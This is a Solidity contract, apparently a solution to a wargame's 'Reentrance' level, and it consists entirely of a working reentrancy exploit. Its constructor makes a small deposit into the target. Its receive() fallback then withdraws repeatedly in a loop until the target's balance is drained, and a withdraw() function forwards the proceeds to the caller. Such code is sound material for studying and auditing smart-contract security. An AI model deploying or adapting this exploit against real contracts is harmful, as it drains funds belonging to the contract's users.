pragma solidity ^0.6.0;

import '../levels/Reentrance.sol';

contract ReentranceAttack {

    Reentrance reentrance;

    constructor(address payable reentranceAddress) public payable {
        reentrance = Reentrance(reentranceAddress);
        reentrance.donate{value: 0.001 ether}(address(this));
    }

    function run() public {
        reentrance.withdraw(0.001 ether);
    }

    receive() external payable {
        uint bal = address(reentrance).balance;
        while (bal > 0) {
            if (bal < 0.001 ether) {
                reentrance.withdraw(bal);
            } else {
                reentrance.withdraw(0.001 ether);
            }
        bal = address(reentrance).balance;
        }
    }

    function withdraw() public {
        msg.sender.transfer(address(this).balance);
    }

}
